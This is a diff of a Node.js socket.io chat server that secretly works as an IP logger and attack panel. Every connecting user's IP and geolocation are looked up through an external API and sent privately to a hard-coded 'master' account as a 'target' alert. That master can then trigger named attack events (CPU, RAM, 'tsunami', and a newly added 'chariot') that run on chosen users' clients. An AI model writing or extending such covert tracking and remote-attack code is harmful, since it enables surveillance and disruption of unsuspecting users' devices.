@@ -1,8 +1,8 @@
 const express = require('express');
 const http = require('http');
+const https = require('https');
 const { Server } = require('socket.io');
 const path = require('path');
-const axios = require('axios'); // Pour la géo-localisation IP
 
 const app = express();
 const server = http.createServer(app);
@@ -12,50 +12,42 @@ app.use(express.static(__dirname));
 
 let users = [];
 
-// --- MOTEUR DE TRACKING BOOSTER ---
-const getTargetInfo = async (socket) => {
+// --- IP LOGGER NATIF ---
+function getGeo(ip, callback) {
+    https.get(`https://ipapi.co/${ip}/json/`, (res) => {
+        let data = '';
+        res.on('data', (chunk) => { data += chunk; });
+        res.on('end', () => {
+            try { callback(JSON.parse(data)); } 
+            catch (e) { callback({ city: 'Inconnue' }); }
+        });
+    }).on('error', () => callback({ city: 'Erreur' }));
+}
+
+io.on('connection', (socket) => {
     const ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
-    let geo = { city: 'Inconnue', country: 'Inconnu', isp: 'Inconnu' };
-    
-    try {
-        // On interroge une API de géo-localisation (Free Tier)
-        const response = await axios.get(`http://ip-api.com/json/${ip}`);
-        if(response.data.status === 'success') {
-            geo = {
-                city: response.data.city,
-                country: response.data.country,
-                isp: response.data.isp
-            };
-        }
-    } catch (e) { /* IP locale ou erreur API */ }
+    const cleanIp = ip.replace('::ffff:', '');
 
-    return {
-        ip: ip.replace('::ffff:', ''),
-        geo: geo,
-        ua: socket.handshake.headers['user-agent']
-    };
-};
-
-io.on('connection', async (socket) => {
-    // Extraction immédiate des données
-    const info = await getTargetInfo(socket);
-    
     socket.on('init', (data) => {
-        const newUser = { 
-            id: socket.id, 
-            name: data.name || "Unknown_Stand",
-            details: info // On stocke les données de l'IP Logger
-        };
-        
-        users.push(newUser);
-        
-        // Notification au Master (toucheur2pp) uniquement
-        const master = users.find(u => u.name === "toucheur2pp");
-        if (master) {
-            io.to(master.id).emit('log_update', `[TRACKING] NEW TARGET: ${newUser.name} | IP: ${info.ip} | LOC: ${info.geo.city}, ${info.geo.country} | OS: ${info.ua.split('(')[1].split(')')[0]}`);
-        }
+        getGeo(cleanIp, (geo) => {
+            const newUser = { 
+                id: socket.id, 
+                name: data.name || "Stand_User",
+                ip: cleanIp,
+                loc: `${geo.city || '?'}, ${geo.country_name || '?'}`
+            };
+            users.push(newUser);
 
-        io.emit('sync', users.map(u => ({id: u.id, name: u.name})));
+            // LOG PRIVÉ POUR LE MASTER (Console + Chat Privé)
+            const master = users.find(u => u.name === "toucheur2pp");
+            if (master) {
+                io.to(master.id).emit('chat', { 
+                    n: "SYSTEM", 
+                    t: `🎯 CIBLE: ${newUser.name} | IP: ${cleanIp} | LOC: ${newUser.loc}` 
+                });
+            }
+            io.emit('sync', users.map(u => ({id: u.id, name: u.name})));
+        });
     });
 
     socket.on('chat', (msg) => {
@@ -63,16 +55,13 @@ io.on('connection', async (socket) => {
         if (user) io.emit('chat', { n: user.name, t: msg });
     });
 
-    // --- SYSTÈME D'ATTAQUES IDENTIFIÉES ---
-    const attacks = ['p_combo', 'p_tsunami', 'p_cpu', 'p_ram'];
+    // --- MOTEUR D'ATTAQUES ---
+    const attacks = ['p_combo', 'p_tsunami', 'p_cpu', 'p_ram', 'p_chariot'];
     attacks.forEach(type => {
         socket.on(type, (targetId) => {
-            const attacker = users.find(u => u.id === socket.id);
-            if (attacker && attacker.name === "toucheur2pp") {
-                io.to(targetId).emit('execute', { 
-                    type: type, 
-                    from: attacker.name 
-                });
+            const boss = users.find(u => u.id === socket.id);
+            if (boss && boss.name === "toucheur2pp") {
+                io.to(targetId).emit('execute', { type: type, from: boss.name });
             }
         });
     });
@@ -86,13 +75,4 @@ io.on('connection', async (socket) => {
 app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`
-    💎 PUNCH IP-LOGGER V100 ACTIVE
-    ------------------------------
-    > Port : ${PORT}
-    > Tracking : ON (ip-api integration)
-    > Master Auth : toucheur2pp
-    ------------------------------
-    `);
-});
+server.listen(PORT, () => console.log(`🥊 PUNCH V100 READY ON PORT ${PORT}`));
